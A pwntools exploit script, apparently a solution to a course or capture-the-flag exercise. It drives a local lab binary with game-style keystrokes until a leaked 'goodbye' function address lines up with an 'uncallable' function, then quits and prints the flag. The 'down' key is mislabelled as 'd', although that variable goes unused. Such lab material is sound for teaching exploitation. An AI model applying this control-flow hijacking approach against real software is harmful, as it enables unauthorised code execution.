#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# a(left) s(down) w(up) d(right) A(auto) q(quit)
left = b"a"
down = b"d"
up = b"w"
right = b"d"
auto = b"A"
quit = b"q"


max_iter = 700      # sometimes it might happen that it runs for too long, thus we stop at some point and retry

def hack():
    r = start()

    # You can now communicate with the process, e.g.,
    # r.sendline("AAAAA")
    # r.recvline()

    goodbye_address = None
    prev_goodbye_address = None

    num_iter1 = 0
    while True:
        line1 = r.recvline(keepends=False)
        goodbye_address = line1.decode().split(' ')[-1]

        r.recvuntil(b"followed by enter:\n")

        if (prev_goodbye_address is not None) and (goodbye_address != prev_goodbye_address):
            break

        prev_goodbye_address = goodbye_address
        r.sendline(auto)

        num_iter1 += 1
        if num_iter1 > max_iter:
            print("Reached max iterations 1")
            raise IndexError()


    print(f'found new goodbye: {num_iter1}')

    uncallable_address = None

    num_iter2 = 0
    while True:
        r.sendline(left)
        line1 = r.recvline(keepends=False)
        goodbye_address = line1.decode().split(' ')[-1]

        line2 = r.recvline(keepends=False)
        uncallable_address = line2.decode().split(' ')[-1]

        r.recvuntil(b"followed by enter:\n")

        if (goodbye_address == uncallable_address):
            break

        num_iter2 += 1
        if num_iter2 > max_iter:
            print("Reached max iterations 2")
            raise IndexError()


    print(f'found equal goodbye and uncallable: {num_iter2}')

    r.sendline(quit)

    flag_output = r.recvall()
    print(flag_output.decode(errors='ignore'))



for _ in range(3):      # With small probability, it might not work, thus increase probability by repetition
    try:
        hack()
    except:
        print("Something went wrong. Trying again")
        pass
